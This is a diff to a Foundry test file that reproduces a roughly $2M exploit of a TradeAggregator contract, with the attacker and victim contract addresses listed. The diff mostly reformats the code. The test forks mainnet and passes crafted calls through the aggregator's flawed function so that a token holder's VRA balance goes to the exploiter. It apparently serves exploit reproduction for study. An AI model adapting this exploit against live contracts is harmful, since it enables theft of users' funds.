@@ -3,6 +3,8 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
 // @KeyInfo - Total Lost : ~$2M
 // Attacker : https://etherscan.io/address/0x2ad8aed847e8d4d3da52aabb7d0f5c25729d10df
 // Vuln Contract : https://etherscan.io/address/0xd3f64baa732061f8b3626ee44bab354f854877ac
@@ -13,7 +15,6 @@ import "forge-std/Test.sol";
 // https://twitter.com/AnciliaInc/status/1766261463025684707
 
 interface ITradeAggregator {
-
     // I've written following structs based on regular swap txs to TradeAggregator
     struct Info {
         address to;
@@ -32,14 +33,15 @@ interface ITradeAggregator {
         uint256 amount;
         bytes data;
     }
-
 }
 
 contract ContractTest is Test {
-
-    ITradeAggregator private constant TradeAggregator = ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
-    IERC20 private constant VRA = IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
-    address private constant tokenHolder = 0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;
+    ITradeAggregator private constant TradeAggregator =
+        ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
+    IERC20 private constant VRA =
+        IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
+    address private constant tokenHolder =
+        0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 19_393_360);
@@ -49,7 +51,11 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_decimal_uint("Exploiter VRA balance before attack", VRA.balanceOf(address(this)), VRA.decimals());
+        emit log_named_decimal_uint(
+            "Exploiter VRA balance before attack",
+            VRA.balanceOf(address(this)),
+            VRA.decimals()
+        );
 
         ITradeAggregator.Info memory info = ITradeAggregator.Info({
             to: address(this),
@@ -72,18 +78,29 @@ contract ContractTest is Test {
             VRA.balanceOf(tokenHolder)
         );
 
-        ITradeAggregator.Call memory call = ITradeAggregator.Call({target: address(VRA), amount: 0, data: callData});
+        ITradeAggregator.Call memory call = ITradeAggregator.Call({
+            target: address(VRA),
+            amount: 0,
+            data: callData
+        });
 
         ITradeAggregator.Call[] memory calls = new ITradeAggregator.Call[](1);
         calls[0] = call;
 
-        bytes memory data = abi.encodeWithSelector(bytes4(0x1ef29a02), info, calls);
+        bytes memory data = abi.encodeWithSelector(
+            bytes4(0x1ef29a02),
+            info,
+            calls
+        );
 
         // Call to flawed function
-        (bool success,) = address(TradeAggregator).call{value: 1 wei}(data);
+        (bool success, ) = address(TradeAggregator).call{value: 1 wei}(data);
         require(success, "Call to TradeAggregator not successful");
 
-        emit log_named_decimal_uint("Exploiter VRA balance after attack", VRA.balanceOf(address(this)), VRA.decimals());
+        emit log_named_decimal_uint(
+            "Exploiter VRA balance after attack",
+            VRA.balanceOf(address(this)),
+            VRA.decimals()
+        );
     }
-
 }
